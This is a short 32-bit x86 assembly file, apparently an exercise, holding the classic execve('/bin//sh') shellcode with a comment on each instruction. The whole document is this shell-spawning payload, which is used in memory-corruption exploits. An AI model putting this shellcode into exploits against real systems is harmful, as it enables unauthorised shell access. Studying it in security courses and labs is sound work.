.section .text
.globl _start
_start:
    xor  %eax, %eax    # clean up the eax
    push %eax          # push eax content into stack
    push $0x68732f2f   # push the hex number into stack "//sh"
    push $0x6e69622f   # push the hex number into stack "/bin"
    mov  %esp, %ebx    # write the content in esp to ebx
    push %eax          # push eax content into stack
    mov  %esp, %ecx    # move the content of esp into ecx
    push %ebx          # push the content in ebx into stack
    mov  %eax, %edx    # write the content in eax into edx
    mov  $0xb, %al     # write hex number 0xb into al
    int  $0x80         # pass the program to interrupt vector 0x80 which is a system call
